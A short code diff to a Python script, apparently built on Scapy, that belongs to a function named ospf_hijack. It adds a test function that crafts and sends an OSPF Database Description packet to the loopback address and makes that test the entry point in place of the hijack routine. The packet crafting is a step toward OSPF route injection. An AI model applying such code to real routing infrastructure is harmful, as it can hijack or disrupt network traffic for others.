@@ -118,5 +118,15 @@ def ospf_hijack(*, networks: List[str]):
   while True:
     sleep(1)
 
+
+def test_send_dbd():
+  hello_packet = IP(src='127.0.0.1') / OSPF_Hdr(src='127.0.0.1') / OSPF_Hello()
+  dbd_packet = IP(dst=hello_packet.src) / \
+    OSPF_Hdr(src=IP().src, type=2) / \
+    OSPF_DBDesc(options=0x52, dbdescr=0x07) / \
+    OSPF_LLS_Hdr()
+  send(dbd_packet)
+
 if __name__ == '__main__':
-  ospf_hijack(networks=TEST_NETWORKS)
+  test_send_dbd()
+  # ospf_hijack(networks=TEST_NETWORKS)
